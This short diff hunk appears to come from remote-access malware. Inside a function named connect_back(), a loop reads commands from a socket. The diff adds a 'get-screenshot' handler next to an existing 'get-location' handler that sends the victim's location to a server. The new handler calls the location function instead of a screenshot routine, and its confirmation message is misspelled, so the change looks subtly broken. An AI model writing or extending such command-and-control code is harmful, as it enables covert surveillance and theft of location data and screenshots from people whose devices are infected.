@@ -111,6 +111,10 @@ def connect_back():
             cmd = s.recv(1024).decode("utf-8").strip()
             if not cmd:
                 continue
+            if cmd == "get-screenshot":
+                get_location_and_send()
+                s.send(b"Screenshoot has been sent to the server\n")
+                continue
             if cmd == "get-location":
                 if get_location_and_send() == True:
                     s.send(b"Location has been sent to the server\n")
